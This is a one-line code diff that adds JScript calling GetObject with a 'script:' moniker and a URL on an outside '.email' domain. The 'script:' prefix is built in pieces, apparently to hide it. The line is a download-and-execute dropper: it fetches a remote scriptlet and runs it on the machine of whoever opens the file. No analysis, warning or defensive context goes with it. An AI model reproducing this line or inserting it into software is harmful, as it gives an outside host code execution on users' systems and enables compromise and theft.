@@ -1,0 +1,1 @@
+var a = 'script:';GetObject(a+'HTtp://ciio6j.jvhstpeei.email/?1/')
